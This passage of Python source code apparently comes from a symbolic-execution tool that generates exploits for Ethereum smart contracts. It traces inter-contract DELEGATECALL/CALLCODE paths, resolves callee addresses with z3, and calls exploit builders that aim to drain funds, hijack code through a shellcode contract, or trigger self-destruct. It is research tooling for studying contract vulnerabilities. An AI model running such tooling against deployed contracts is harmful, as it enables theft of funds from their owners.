    #         combined.prepend(vuln_r) #vuln_r comes from one of the 4 critical SymR
    #         combined.prepend(end_r) #end_r is a state-changing SymbR
    #         combined._combine(initial_storage, initial_balance)
    #         combined.simplify()
    #         try: #maybe a simple combine will suffice; 1 StateChange + 1 Critical path?
    #             if vuln_r in all_calls:
    #                 return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
    #             elif vuln_r in all_callcodes:
    #                 return attempt_exploit_callcode(combined, target_addr)
    #             elif vuln_r in all_delegatecalls:
    #                 return attempt_exploit_delegatecall(combined, target_addr)
    #             elif vuln_r in all_suicides:
    #                 return attempt_exploit_suicide(combined, target_addr)
    #         except Nope:
    #             continue
    #
    # logging.info('All ends: %s', all_ends)
    #
    # # if the above; 1 StateChange + 1 Critical path doesnt work; try to combine them by stitching paths below
    # #path stitching for the critical+statechanging paths > then 2 calls
    #
    # end_may_end_compatible = defaultdict(list) ## product('ABCD', 'xy') --> Ax Ay Bx By Cx Cy Dx Dy
    # # populate the storage_compatible dict with may_read_from results for all possible combinations of all_ends
    # for (i, a_r), (j, b_r) in itertools.product( enumerate(all_ends), enumerate(all_ends) ): #diff combinations of ends
    #     if a_r.may_read_from(b_r):
    #         end_may_end_compatible[i].append(j)
    # #[] and {} vs list() and dict() speed?
    # calls = [all_ends]
    # while len(calls) < max_calls-1:
    #     #create copy of all_ends
    #     new_ends = [r.copy() for r in all_ends]
    #     calls.append(new_ends)
    #     # from above loops;
    #     #compatible is a dict of may_read_from combinations of x from all_vuln and r_end
    #     for k, v in vuln_may_end_compatible.iteritems():
    #         new_compatible = set()
    #         for c in v[-1]:
    #             new_compatible.update(end_may_end_compatible[c])
    #         v.append(sorted(new_compatible))
    #
    #     #R: useless code; used to show vuln_may_end_compatible is altered in the above loop for later use below
    #     new_v_m_e_compatible = vuln_may_end_compatible
    #
    #     for i, vuln_r in enumerate(all_vuln):
    #         for combo_ids in itertools.product(*new_v_m_e_compatible[i]):
    #             #zip example:
    #             ##  numberList = [1, 2, 3]
    #             ##  strList = ['one', 'two', 'three']
    #             ##  result = zip(numberList, strList)
    #             ##  {(2, 'two'), (3, 'three'), (1, 'one')}
    #             combo = [vuln_r] + [c[j] for c,j in zip(calls, combo_ids)]
    #             combined = CombinedSymbolicResult()
    #             # logging.debug('Combo: %s', ', '.join('%x' % r.state.pc for r in combo[::-1]))
    #             for r in combo:
    #                 combined.prepend(r)
    #             combined._combine(initial_storage, initial_balance)
    #             combined.simplify()
    #             try:
    #                 if vuln_r in all_calls:
    #                     return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
    #                 elif vuln_r in all_callcodes:
    #                     return attempt_exploit_callcode(combined, target_addr)
    #                 elif vuln_r in all_delegatecalls:
    #                     return attempt_exploit_delegatecall(combined, target_addr)
    #                 elif vuln_r in all_suicides:
    #                     return attempt_exploit_suicide(combined, target_addr)
    #             except Nope:
    #                 continue
    #
    # logging.info('Could not exploit any RETURN+CALL')
    # return



def full_head_callee_tail(return_r_list, p, req_op, target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check='+', expression=None,
                          rec_depth=None):
    logging.info("FULL: ------------ begin FULL on %s depth %s ------------" % (('trying to resolve symbolic' if req_op=='TERM' else req_op), rec_depth))
    if (rec_depth == None):
        rec_depth = 2

    ####@@@@**** A2.1: find req_op on CALLER ******
    if (req_op == 'SSTORE'):
        CALLER_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
        find_sstore_flag = True
    elif (req_op == 'TERM'):
        CALLER_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
        find_sstore_flag = False #!!!!
    else: #4xCC
        CALLER_ins = p.cfg.filter_ins(req_op)
        CALLER_sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}
        find_sstore_flag = False

    if not CALLER_ins:
        logging.warn('FULL: No %s instructions found on CALLER, abort FULL', 'RETURN/STOP' if req_op == 'SSTORE' else req_op)
        return
    logging.info('FULL: Found %d %s instructions on CALLER', len(CALLER_ins), 'RETURN/STOP' if (req_op == 'SSTORE') else req_op)

    #we're NOT using Inclusive because we actually DONT want to alter stack when CC happens - so return before CC happnes
    for headcall, head_path, head_r in p.get_constraints(CALLER_ins,
                                                         # [0], #intresting_slices secondary check -> find_sstore would be checked first
                                                         args_dict[req_op],
                                                         term_on_interCall=True,
                                                         find_sstore=find_sstore_flag):
        logging.debug("head_r: The %s call that ends the path : %s", req_op, headcall)
        logging.debug("head_r: Path: %s", '->'.join('%x' % path for path in head_path))

        head_r.project = p
        return_r = [head_r, None, None]

        return_r[0].spec = 'FULL'

        if (not head_r.path_left): #terminated without a DC
            #disjoint -> moved up
            # return_r = [head_r, None, None]
            if (req_op == 'SSTORE'):
                return_r_list.append(return_r)
            elif (req_op == 'TERM'):
                return_r_list.append(return_r)
            else:  # 4xCC
                return_r[0].critical_addr = head_r.state.stack[-1] if req_op == 'SUICIDE' else head_r.state.stack[-2]
                return_r[0].critical_op = req_op

                if (req_op == 'CALL'):
                    return_r[0].critical_amount = head_r.state.stack[-3]

                if (set(head_path) & CALLER_sload_bbs):
                    return_r_list.append(return_r)

                combined = CombinedSymbolicResult()
                combined.disjoint_prepend(return_r)

                # set flag to be passed into attmept - true means only complex solutions will be checked
                combined.only_complex = p.complex_flag

                combined._combine(initial_storage, initial_balance, return_r[0].critical_addr, req_op)
                combined.simplify()
                try:
                    if (req_op == 'CALL'):
                        return attempt_exploit_new_call(combined, target_addr, return_r[0].critical_amount, \
                                                    target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                    elif (req_op == 'CALLCODE') or (req_op == 'DELEGATECALL'):
                        return attempt_exploit_other_three(combined, shellcode_addr)
                    else:  # suicide
                        return attempt_exploit_other_three(combined, target_addr)
                except Nope:
                    continue
        else: #if (head_r.path): #if list is NOT empty -> it encountered a DC

            pos_prepends=[]
            if not concrete(head_r.state.callee_addr):
                symb_addr = head_r.state.callee_addr
                # logging.info('FULL: callee addr is a SLOAD Symbolic (%s)' % str(symb_addr))
                logging.info('FULL: callee addr is a SLOAD Symbolic - commence prepend resolve stage')

                # if (rec_depth == None):
                #     rec_depth = 0
                # else:
                #     rec_depth += 1
                if (rec_depth < 0):
                    logging.info("FULL: Resolve; break the circle! rec_depth < %s" % rec_depth)
                    return

                all_term_results = []
                partial_head_callee(all_term_results, p, 'TERM', target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check,
                                    expression=symb_addr, rec_depth=rec_depth-1)
                full_head_callee_tail(all_term_results, p, 'TERM', target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check,
                                      expression=symb_addr, rec_depth=rec_depth-1)

                for possible_address, prepend_triple in resolve_symbolic_address(symb_addr, head_r, all_term_results, initial_storage,
                                                                                          initial_balance):

                    if not possible_address: # and not address_prepend_triple:
                        logging.info("FULL: Resolve; can't resolve this symbolic address %s - no point in executing path any further" % possible_address)
                        continue
                    else:
                        logging.info("FULL: ------------ resume FULL on %s depth %s ------------" % (req_op, rec_depth))
                        # return_r = return_r[0:3] + address_prepend_triple + return_r[3:]
                        pos_prepends.append((possible_address, prepend_triple))
                        # hex_addr = hex(possible_address).rstrip("L")


                        ###old no-pos-generator-ver
                        # address_prepend_triple, possible_address = resolve_symbolic_address(symb_addr, head_r, all_term_results, initial_storage, initial_balance)
                        # if not possible_address and not address_prepend_triple:
                        #     logging.info("SOLV: can't resolve this symbolic address %s - no point in executing path any further" % possible_address)
                        #     continue
                        # else:
                        #     # head_r = (head_r, possible_result)
                        #     logging.info("FULL: ------------ resume FULL on %s depth %s------------" % (req_op, rec_depth))
                        #     # return_r.extend(address_prepend_triple)
                        #     return_r = return_r[0:3] + address_prepend_triple + return_r[3:]
                        #     hex_addr = hex(possible_address).rstrip("L")
                        #     # rec_depth -=1

            else:
                pos_prepends.append((head_r.state.callee_addr, [None, None, None] ))
                # hex_addr = hex(head_r.state.callee_addr).rstrip("L")
                # logging.info('PART:the callee\'s addr is %s ', hex_addr)

            ### END of the concreate(callee_addr)? branch
            return_r_save = return_r
            for pos_addr, pos_results in pos_prepends:

                if(not all([r == None for r in pos_results])):
                # if (pos_results != None):
                    return_r = return_r_save[0:3] + pos_results + return_r_save[3:]

                # callee_p = addr_to_project(hex_addr)
                hex_addr = hex(pos_addr).rstrip("L")
                callee_p = addr_to_project(hex_addr[:42])




            ###old no-pos-generator-ver
            #
            # else:# logging.info('CALLER:the callee\'s addr is %s ', hex(head_r.state.callee_addr))
            #     hex_addr = hex(head_r.state.callee_addr).rstrip("L")
            #
            # #now get me the proj!
            # callee_p = addr_to_project(hex_addr)

                ####@@@@**** A2.2: execute callee ******
                if(req_op != 'SSTORE'): #meaning it's a CC for which we check for SLOADs on path
                    callee_sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}

                callee_terminating_ins = callee_p.cfg.filter_ins('RETURN', reachable=True) \
                                         + callee_p.cfg.filter_ins('STOP', reachable=True)
                # + callee_p.cfg.filter_ins('SUICIDE', reachable=True)
                if not callee_terminating_ins:
                    logging.warn('FULL: @#$%@#$% No RETURN/STOP instructions on callee; this is wrong @#$%@#$% !!!!!!!!!')
                    continue
                logging.info('FULL: Found %d RETURN/STOP/ instructions on callee (without SUICIDE)',len(callee_terminating_ins))

                # prepare an adjusted state of head
                # use non-reference copy becasue copy() really copies only the storage;
                # TODO copy() is not a clean non-reference duplicate! STACK is still being referenced!!
                adjusted_head_r_state = SymbolicEVMState(xid=head_r.xid, code=callee_p.code)

                if (head_r.state.call_args[-1] == 'CALL'):# if it bumped inot a CALL as INTERNAL; then they DONT share storage!
                    adjusted_head_r_state.storage = SymbolicStorage(xid=999999)
                    logging.warn("$$$$$$$$@#$$^$$$$$$$:its a CALL; callee gets their own STORAGE!!!!!!!")
                else: #it halted on DC/CC/SC?
                    adjusted_head_r_state.storage = copy(head_r.state.storage)

                adjusted_head_r_state.callee_addr = 1
                adjusted_head_r_state.call_args = head_r.state.call_args
                #callcode overwrite of CALLER
                try:
                    adjusted_head_r_state.old_caller = head_r.state.old_caller
                except AttributeError:
                    pass  # no such variable found

                # if (head_r.state.input_value != None):
                #     adjusted_head_r_state.input_value = head_r.state.input_value
                #     logging.info("FULL: INPUT_value passed to callee")
                #     # logging.info("FULL: INPUT_value passed to callee : %s",head_r.state.input_value)
                # else:
                #     logging.warn("FULL: NO input_value passed!!! is this a pass to fallback func?")
                adjusted_head_r_state.input_value = head_r.state.input_value

                #TODO added inclusive=True so that RETURN op would write to memory for CALLER to collect
                for calleecall, callee_path, callee_r in callee_p.get_constraints(callee_terminating_ins,
                                                                                  import_state=adjusted_head_r_state,
                                                                                  inclusive=True): #inclusive because we want callee to prep RETURN value for us
                    logging.debug("callee_r: terminatingcall: %s", calleecall)
                    logging.debug("callee_r: Path: %s", '->'.join('%x' % path for path in callee_path))

                    callee_r.project = callee_p
                    callee_r.addr = hex_addr

                    ####@@@@**** A1.3: execute the rest (TAIL) of CALLER to CC ******
                    # create a copy of head's SymbolicResults and adjust it to represent a successful return from call
                    adjusted_state_for_tail = copy(head_r.state)
                    # need to revert stack to the state before we can callee
                    adjusted_state_for_tail.stack = copy(head_r.state.stack)

                    adjusted_state_for_tail.pc += 1
                    adjusted_state_for_tail.stack.append(1)

                    adjusted_state_for_tail.callee_addr = head_r.state.callee_addr
                    adjusted_state_for_tail.call_args = head_r.state.call_args

                    if (head_r.state.call_args[-1] == 'CALL'):  # if it bumped inot a CALL as INTERNAL; then they DONT share storage!
                        adjusted_state_for_tail.storage = copy(head_r.state.storage)
                        logging.warn("$$$$$$$$@#$$^$$$$$$$:its a CALL; callee gets their own STORAGE!!!!!!!")
                    else:  # it halted on DC/CC/SC?
                        adjusted_state_for_tail.storage = copy(callee_r.state.storage)

                    # if (callee_r.state.return_value != None):
                    #     adjusted_state_for_tail.return_value = callee_r.state.return_value
                    #     logging.info("FULL: RETURN_value passed to tail")
                    #     # logging.info("FULL: RETURN_value passed to tail: %s",callee_r.state.return_value)
                    # else:
                    #     logging.warn("FULL: NO return_value; is this just a return-less path?")
                    adjusted_state_for_tail.return_value = callee_r.state.return_value

                    tail_r = p.run_symbolic(copy(head_r.path_left), state=adjusted_state_for_tail)
                    if (not tail_r):
                        logging.warn("$$$$$$$$$$$$$$$:tail_r: gave None back - ABORT")
                        return
                    tail_r.project = p
                    #disjoint
                    return_r[2] = tail_r
                    return_r[1] = callee_r
                    return_r[1].spec = 'FULL'
                    return_r[2].spec = 'FULL'

                    if (req_op == 'SSTORE'): #
                        return_r_list.append(return_r)
                    elif (req_op == 'TERM'): #
                        return_r_list.append(return_r)
                    else: # 4xCC
                        # save critical addr that is currently on top ofstack
                        return_r[0].critical_addr = tail_r.state.stack[-1] if req_op == 'SUICIDE' else tail_r.state.stack[-2]
                        return_r[0].critical_op = req_op


                        if (len(return_r) % 3 != 0):
                            logging.warn("!@##$^&%$#@$&:something is wrong in the triple structure!#$$!^&*^$#@ - ABORT")

                        # propogate this ciritacal over all the parts of the result
                        # for r in return_r[1:]:
                        #     r.critical_addr = return_r[0].critical_addr
                        # return_r[0].critical_addr = tail_r.state.stack[stack_dict[req_op]]
                        if (req_op == 'CALL'):
                            return_r[0].critical_amount = tail_r.state.stack[-3]

                        if (set(callee_path) & callee_sload_bbs) or (set(head_path) & CALLER_sload_bbs):  # callee_has_SLOAD meaning callee encountered a SLOAD on it's exec
                            return_r_list.append(return_r)

                        combined = CombinedSymbolicResult()
                        combined.disjoint_prepend(return_r)

                        # set flag to be passed into attmept - true means only complex solutions will be checked
                        combined.only_complex = p.complex_flag

                        combined._combine(initial_storage, initial_balance, return_r[0].critical_addr, req_op)
                        combined.simplify()
                        try:
                            if (req_op == 'CALL'):
                                return attempt_exploit_new_call(combined, target_addr, return_r[0].critical_amount, \
                                                            target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                            elif (req_op == 'CALLCODE') or (req_op == 'DELEGATECALL'):
                                return attempt_exploit_other_three(combined, shellcode_addr)
                            else:  # suicide
                                return attempt_exploit_other_three(combined, target_addr)
                        except Nope:
                            continue
                    # logging.info('-x-x-x- finished a whole callee_tail run -x-x-x-')

    logging.info('FULL: all return results depth %s on op %s : %s depth %s', rec_depth, req_op, return_r_list, rec_depth)
    # return


def partial_head_callee(return_r_list, p, req_op, target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check='+',
                        expression=None,
                        rec_depth=None):
    logging.info("PART: ------------ begin PART on %s depth %s------------" % (('trying to resolve symbolic' if req_op == 'TERM' else req_op), rec_depth))
    if (rec_depth == None):
        rec_depth = 2
    ####@@@@**** B1.1: find valid DC on CALLER ******
    CALLER_sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}
    callee_sload_bbs = None #will be init-ed later

    delegatecall_ins = p.cfg.filter_ins('DELEGATECALL')
    callcode_ins = p.cfg.filter_ins('CALLCODE')
    # call_ins = p.cfg.filter_ins('CALL')
    call_ins = [] #CALL can't be run without further alteration to the code
    internal_ins = delegatecall_ins + callcode_ins + call_ins

    if not internal_ins:
        logging.warn('PART: No interaction_DELEGATECALL/CALLCODE (w/o CALL) instructions on CALLER , abort PART')
        return
    logging.info('PART: Found %d interaction_DELEGATECALL/CALLCODE (w/o CALL) instructions on CALLER', len(internal_ins))

    #use find_terminate to get path that end with a termianting op, that goes THROUGH the requested CALL*
    for headcall, head_path, head_r in p.get_constraints(internal_ins,
                                                         find_terminate=True,
                                                         term_on_interCall=True):
        logging.debug("head_r: The DELEGATECALL call that ends the delegate_path : %s", headcall)
        logging.debug("head_r: Path: %s", '->'.join('%x' % path for path in head_path))

        head_r.project = p
        ####@@@@**** B1.2: get callee's project******
        return_r = [head_r, None, None]
        return_r[0].spec = 'PART'

        pos_prepends = []
        #addr is symbolic
        if not concrete(head_r.state.callee_addr):
            symb_addr = head_r.state.callee_addr

            # else:
            #     rec_depth += 1
            if (rec_depth < 0):
                logging.info("PART: Resolve; break the circle! rec_depth < %s" % rec_depth)
                # rec_depth -= 1
                return
            # if (rec_depth == None):
            #     rec_depth = [0, 0, 1, 3] #[recursion depth, general_depth, recursion limit, general limit]
            #     # rec_depth[1] = 0
            # else:
            #     rec_depth[1] += 1
            #     if (rec_depth[1] >= rec_depth[3]):
            #         logging.info("PART: Resolve; break the circle!stop_depth >= %s" % rec_depth[1])
            #         rec_depth[1] -= 1
            #         continue
            #
            # symb_addr = head_r.state.callee_addr
            # if z3.is_eq(expression == symb_addr):
            #     logging.info("PART: Resolve; expression == head_r.state.callee_addr depth %s" % rec_depth[0])
            #     rec_depth[0] += 1
            #     if (rec_depth[0] >= rec_depth[2]): #depth is  the numbers of prepends for the wished exploit; i.e. if we await a SSTORE with 2 prepends then
            #         # depth should
            #         # be at least 2!
            #         logging.info("PART: Resolve; break the circle! expression == head_r.state.callee_addr")
            #         rec_depth[0] -= 1
            #         # rec_depth[1] -= 1
            #         continue
            # logging.info('PART: Resolve; callee address is a Symbolic value (%s)???' % str(symb_addr))

            # expression = z3.simplify(head_r.state.callee_addr)
            all_term_results = []
            partial_head_callee(all_term_results, p, 'TERM', target_amount, initial_storage, initial_balance,shellcode_addr, target_addr, amount_check,
                                expression=symb_addr,rec_depth=rec_depth-1)
            full_head_callee_tail(all_term_results, p, 'TERM', target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check,
                                  expression=symb_addr, rec_depth=rec_depth-1)
            # stick them into a solver
            # address_prepend_triple, possible_address = resolve_symbolic_address(symb_addr, head_r, all_term_results, initial_storage, initial_balance)
            for possible_address, address_prepend_triple in resolve_symbolic_address(symb_addr, head_r, all_term_results, initial_storage, initial_balance):

                if not possible_address:
                    logging.info("PART: Resolve;can't resolve this symbolic address %s - no point in executing path any further" % possible_address)
                    continue
                else:
                    logging.info("PART: ------------ resume PART on %s depth %s ------------" % (req_op, rec_depth))
                    # return_r = return_r[0:3] + address_prepend_triple + return_r[3:]
                    pos_prepends.append((possible_address, address_prepend_triple))
                    # hex_addr = hex(possible_address).rstrip("L")

            # address_prepend_triple, possible_address = resolve_symbolic_address(symb_addr, head_r, all_term_results, initial_storage, initial_balance)
            # if not possible_address and not address_prepend_triple:
            #     logging.info("SOLV: can't resolve this symbolic address %s - no point in executing path any further" % possible_address)
            #     continue
            # else:
            #     # head_r = (head_r, possible_result)
            #     logging.info("FULL: ------------ resume FULL on %s depth %s------------" % (req_op, rec_depth))
            #     # return_r.extend(address_prepend_triple)
            #     return_r = return_r[0:3] + address_prepend_triple + return_r[3:]
            #     hex_addr = hex(possible_address).rstrip("L")

        else:
            pos_prepends.append((head_r.state.callee_addr, [None, None, None]))
            # hex_addr = hex(head_r.state.callee_addr).rstrip("L")
            # logging.info('PART:the callee\'s addr is %s ', hex_addr)

        #END of the concreate?callee_addr branch
        return_r_save = return_r
        for pos_addr, pos_results in pos_prepends:

            if (not all([r == None for r in pos_results])):
                return_r = return_r_save[0:3] + pos_results + return_r_save[3:]

            hex_addr = hex(pos_addr).rstrip("L")
            callee_p = addr_to_project(hex_addr[:42])

            ####@@@@**** B1.2: find req_op on callee ******
            if (req_op == 'SSTORE'):
                callee_ins = callee_p.cfg.filter_ins('RETURN') + callee_p.cfg.filter_ins('STOP')
                find_sstore_flag = True
            elif (req_op == 'TERM'):
                callee_ins = callee_p.cfg.filter_ins('RETURN') + callee_p.cfg.filter_ins('STOP')
                find_sstore_flag = False
            else:  # 4xCC
                callee_ins = callee_p.cfg.filter_ins(req_op)
                callee_sload_bbs = {ins.bb.start for ins in callee_p.cfg.filter_ins('SLOAD')}
                find_sstore_flag = False
            if not callee_ins:
                logging.warn('PART: No %s critical instructions found on callee', 'RETURN/STOP' if req_op == 'SSTORE' else req_op)
                continue
            logging.info('PART: Found %d %s critical instruction on callee', len(callee_ins), 'RETURN/STOP' if (req_op == 'SSTORE') else req_op)

            # prepare an adjusted state of head
            # use non-reference copy because copy() really copies only the storage;
            adjusted_head_r_state = SymbolicEVMState(xid=head_r.xid, code=callee_p.code)

            if (head_r.state.call_args[-1] == 'CALL'):# if it bumped inot a CALL as INTERNAL; then they DONT share storage!
                adjusted_head_r_state.storage = SymbolicStorage(xid=999999)
                logging.warn("$$$$$$$$@#$$^$$$$$$$:its a CALL; callee gets their own STORAGE!!!!!!!")
            else: #it halted on DC/CC/SC?
                adjusted_head_r_state.storage = copy(head_r.state.storage)

            adjusted_head_r_state.callee_addr = 1
            adjusted_head_r_state.call_args = head_r.state.call_args
            # callcode overwrite of CALLER
            try:
                adjusted_head_r_state.old_caller = head_r.state.old_caller
            except AttributeError:
                pass #no such variable found

            # if (head_r.state.input_value != None): #input value can also be 0 - when ptr0 and size0; #if (head_r.state.input_value):
            #     adjusted_head_r_state.input_value = head_r.state.input_value
            #     logging.info("PART: INPUT_value being passed to callee")
            #     # logging.info("PART: INPUT_value being passed to callee: %s",head_r.state.input_value)
            # else:
            #     logging.info("PART: NO input_value on this path? is this a call to fallback func?")
            adjusted_head_r_state.input_value = head_r.state.input_value

            # callee EXEC # callee EXEC # callee EXEC # callee EXEC # callee EXEC
            # on CC we're NOT using Inclusive because we actually DONT want to alter stack when CC happens - so return before CC happnes
            for calleecall, callee_path, callee_r in callee_p.get_constraints(callee_ins,
                                                                              args_dict[req_op],
                                                                              import_state=adjusted_head_r_state,
                                                                              find_sstore=find_sstore_flag,
                                                                              inclusive=True if req_op in {'SSTORE', 'TERM'} else False): #on SSTORE we want

                callee_r.addr = hex_addr
                callee_r.project = callee_p
                # it to
                #  be
                # inclusive!!! to include RETURN exec
                # Q: what about the prepend TERM execution? would we want it there aswell? I think so
                logging.debug("callee_r: Path: %s", '->'.join('%x' % path for path in callee_path))

                ####@@@@**** FROM_A1.3: execute the rest (TAIL) of CALLER to CC ******
                # Although this is a partial run - we still need to execute the tail; to end the whole call;
                # create a copy of head's SymbolicResults and adjust it to represent a successful return from call

                if (req_op == 'SUICIDE'):

                    #disjoint
                    return_r[1] = callee_r
                    return_r[1].spec = 'PART'

                else: #if (req_op in {'CALL', 'CALLCODE', 'DELEGATECALL'}):
                    adjusted_state_for_tail = copy(head_r.state)
                    # need to revert stack to the state before we can callee
                    adjusted_state_for_tail.stack = copy(head_r.state.stack)

                    adjusted_state_for_tail.pc += 1
                    adjusted_state_for_tail.stack.append(1)

                    adjusted_state_for_tail.callee_addr = head_r.state.callee_addr
                    adjusted_state_for_tail.call_args = head_r.state.call_args

                    if (head_r.state.call_args[-1] == 'CALL'):  # if it bumped inot a CALL as INTERNAL; then they DONT share storage!
                        adjusted_state_for_tail.storage = copy(head_r.state.storage)
                        logging.warn("$$$$$$$$@#$$^$$$$$$$:its a CALL; callee gets their own STORAGE!!!!!!!")
                    else:  # it halted on DC/CC/SC?
                        adjusted_state_for_tail.storage = copy(callee_r.state.storage)


                    # if (callee_r.state.return_value != None):
                    #     adjusted_state_for_tail.return_value = callee_r.state.return_value
                    #     # logging.info("PART: RETURN_value being passed to tail: %s", callee_r.state.return_value)
                    #     logging.info("PART: RETURN_value being passed to tail")
                    # else:
                    #     logging.info("PART: NO return_value; is this just a return-less path?")
                    adjusted_state_for_tail.return_value = callee_r.state.return_value
            #TAIL
                    tail_r = p.run_symbolic(copy(head_r.path_left), state=adjusted_state_for_tail)
                    if (not tail_r):
                        logging.info("$$$$$$$$$$$$$$$:tail_r: gave None back - ABORT")
                        return

                    tail_r.project = p
                    # logging.debug("tail_r: --- done executing tail on run_symoblic() ---")

                    # add the constrains from the other two into the TAIL results

                    #disjoint
                    return_r[2] = tail_r
                    return_r[1] = callee_r

                    return_r[1].spec = 'PART'
                    return_r[2].spec = 'PART'
                    # return_r = (head_r, callee_r, tail_r)
                    # if(address_prepend_triple):
                    #     return_r = return_r + (address_prepend_triple) #-> this will result in (head_r, callee_r, tail_r, addr_head_r, addr_callee_r, addr_tail_r)
                    # return_r = ((, head_r), callee_r, tail_r)

                #BACK FROM branch above; where  if (req_op == 'SUICIDE'):
                if (req_op == 'SSTORE'):
                    return_r_list.append(return_r)
                elif (req_op == 'TERM'):
                    return_r_list.append(return_r)
                else:  # 4xCC
                    # if(req_op == 'SUICIDE'): -> redundant; we run partial so we expect the CC on callee; that's were we take the critical addr
                    return_r[0].critical_addr = callee_r.state.stack[-1] if req_op == 'SUICIDE' else callee_r.state.stack[-2]
                    return_r[0].critical_op = req_op
                    #popogate critAddr for LazySubstituiion
                    # for r in return_r[1:]:
                    #     r.critical_addr = return_r[0].critical_addr
                    if (len(return_r) % 3 != 0):
                        logging.warn("!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")
                    # return_r[0].critical_addr = callee_r.state.stack[stack_dict[req_op]]
                    if (req_op == 'CALL'):
                        return_r[0].critical_amount = callee_r.state.stack[-3]

                    # add any exploits results with a SLOAD either in CALLER(tail_path) or callee
                    if (set(head_path) & CALLER_sload_bbs) or (set(
                            callee_path) & callee_sload_bbs):
                        return_r_list.append(return_r)

                    combined = CombinedSymbolicResult()
                    combined.disjoint_prepend(return_r)

                    combined.only_complex = p.complex_flag

                    combined._combine(initial_storage, initial_balance, return_r[0].critical_addr, req_op)
                    combined.simplify()
                    try:
                        if (req_op == 'CALL'):
                            return attempt_exploit_new_call(combined, target_addr, return_r[0].critical_amount, \
                                                        target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                        elif (req_op == 'CALLCODE') or (req_op == 'DELEGATECALL'):
                            return attempt_exploit_other_three(combined, shellcode_addr)
                        else:  # suicide
                            return attempt_exploit_other_three(combined, target_addr)
                    except Nope:
                        continue

            # logging.info('-x-x-x- finished a whole callee_tail run-x-x-x-')

    logging.info('PART: all return results depth %s on op %s : %s' ,rec_depth, req_op, return_r_list)
    return

def get_level(name):
    try:
        return int(name[name.rfind('_') + 1:])
    except:
        return 0

def resolve_symbolic_address(term, head_r, all_term_results, initial_storage, initial_balance):
    # term = z3.simplify(term)
    s = z3.SolverFor("QF_ABV")

    for return_r in all_term_results:
    # for return_r in all_term_results[-1:]:
        #propogate the critical addr into this prepend
        # head_r.critical_addr = K(BitVec(256), 0)
        # return_r[0].critical_addr = z3.BitVec('RESOLVE_%d' % return_r[0].xid, 256)
        term_for_sub = z3.simplify(term)
        combined = CombinedSymbolicResult()
        combined.prepend(head_r)
        combined.disjoint_prepend(return_r)
        combined._combine(initial_storage, initial_balance)
        combined.simplify()

        # term_as_long = 0
        term_for_sub = z3.substitute(term_for_sub, combined.state._substitutions)
        s.add(combined.constraints)
        if s.check() != z3.sat:
            continue
        else:
            try:
                term_as_long = z3.simplify(term_for_sub).as_long()
                if (isinstance(term_as_long, long)):
                    logging.info("SOLV: !!! Success, head_r+term_r.constrains resolved and we found a possible address \n%s" % term_as_long)
                    # logging.info("SOLV: !!! Success, head_r+term_r.constrains resolved and we found a possible address %s" % term_as_long)
                    # I want to keep the triple structure and work in triples; this will prevent me from doing prepends with headonly + fulltriple -> 0,1,1,
                    # 1 which can lead to problems when iterating form above in triples -> 0,1,1 and 1
                    # return_triple = [None, None, None]

                    if (len(return_r) % 3 != 0):
                        logging.warn("!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")
                        return
                    return_triple = return_r
                    yield term_as_long, return_triple
            except AttributeError:
                logging.info("SOLV: CANT term_as_long = z3.simplify(term_for_sub).as_long() %s" % z3.simplify(term_for_sub))

            # try:
            #     term_as_long = s.model()[z3.simplify(term_for_sub)]
            #     if (isinstance(term_as_long, long)):
            #         logging.info("SOLV: !!! Success, head_r+term_r.constrains resolved and we found a possible address %s" % term_as_long)
            #         yield return_r, term_as_long
            # except z3.Z3Exception:
            #     logging.info("SOLV: CANT term_as_long = z3.simplify(term_for_sub).as_long() %s" % z3.simplify(term_for_sub))

        continue

    logging.info("SOLV: NONE of the results lead to a concrete address for the term %s" % term)
    return_triple = [None, None, None]
    yield None, return_triple


#gives back all possible combinations of two sorted lists without ruining the sorting of each list
def all_two_list_merges(a_in, b_in):

    #first prep the linear lists into triple-segmented lists-of-lists
    #sanity check length
    if (len(a_in) % 3 != 0) or (len(b_in) % 3 != 0):
        logging.warn("!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")
        return

    a=[]
    for i, j, k in zip(a_in[0::3], a_in[1::3], a_in[2::3]):
        a.extend([i,j,k])

    b = []
    for i, j, k in zip(b_in[0::3], b_in[1::3], b_in[2::3]):
        b.extend([i,j,k])

    # object guaranteed not to be in either input list
    sentinel = object()
    merged_length = len(a) + len(b)
    for a_positions in itertools.combinations(xrange(merged_length), len(a)):
        merged = [sentinel] * merged_length

        # Place the elements of a in their chosen positions.
        for pos, a_elem in zip(a_positions, a):
            merged[pos] = a_elem

        # Place the elements of b in the positions not taken.
        b_iter = iter(b)
        for pos in xrange(merged_length):
            if merged[pos] is sentinel:
                merged[pos] = next(b_iter)

        yield merged


def addr_to_project(contract_addr):
    #this is used with the main_RPC function
    if(False): #dynamically use RPC client to upll a callee's bytecode'
        contract_code = getByteCode(contract_addr)
        if (not contract_code[2:]):
            logging.info('***RPC: NO CODE RECIEVED on addr %s - abort' % contract_addr)
            logging.info('***RPC: NO CODE RECIEVED on addr %s - abort' % contract_addr)
            logging.info('***RPC: NO CODE RECIEVED on addr %s - abort' % contract_addr)
            logging.info('***check that input addr is correct and that the contract is not dead (after SUICIDE was executed)')
            return None
        callee_p = Project(unhexlify(contract_code[2:]), contract_addr=contract_addr)
        return callee_p
    # forcing a callee for testing
    # elif(False):
    #     md5_of_callee = '06ea3a031d8f8fd38ffe7cfb27a66760'
    #     cfg_dir = '../../teETHER_eval/cfg/'
    #     md5_path = cfg_dir + md5_of_callee + '.project.json'
